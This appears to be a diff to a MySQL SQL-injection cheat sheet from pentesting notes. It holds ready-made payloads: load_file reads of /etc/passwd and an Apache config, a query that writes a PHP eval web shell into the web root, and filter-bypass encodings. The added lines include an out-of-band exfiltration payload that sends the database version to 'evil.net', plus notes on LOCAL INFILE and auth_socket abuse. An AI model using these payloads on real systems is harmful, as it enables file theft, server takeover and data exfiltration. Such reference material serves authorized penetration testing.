@@ -8,6 +8,7 @@ auxiliary/scanner/mysql/mysql_authbypass_hashdump
 # common tricks
 select user(),database(),version(),@@datadir,5
 select load_file('/etc/passwd') or SELECT CAST(load_file( '/etc/apache2/sites-enabled/000-default') AS char) 
+select load_file(concat('\\',version(),'evil.net\oob'))
 select "<?php eval($_REQUEST['c']); ?>",2,3,4 INTO OUTFILE "/var/www/html/temp/webshell.php" -- # or use eval()
 
 # multibyte to bypass mysql-real-escape-string (db driver and db don't talk same charset) http://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql
@@ -24,6 +25,8 @@ select -> select%23randomText%0A and user() -> user%23randomText%0A() # see sqlm
 select X'31333337' == select 0x31333337
 comments: /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(table_name) /*!50000from*/ information_schema.tables
 no space: (select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))
+client-side arbitrary file inclusion LOCAL INFLE https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html
+become root via auth_socket, use different protocol to open files with COM_BINLOG_DUMP (need REPLICATION SLAVE privilege) or guess root pw with COM_CHANGE_USER command 
 
 # group_concat to get everything in one line and one column
 select group_concat(schema_name separator 0x2c) from information_schema.schemata;
@@ -116,6 +119,7 @@ udf (sqlmap or https://github.com/hatRiot/sql3_udf)
 # recover root pw
 http://www.percona.com/blog/2014/12/10/recover-mysql-root-password-without-restarting-mysql-no-downtime/
 
-# rdot advanced tricks
+# advanced tricks
 https://rdot.org/forum/showthread.php?p=37133
 https://rdot.org/forum/showthread.php?t=3167
+https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf
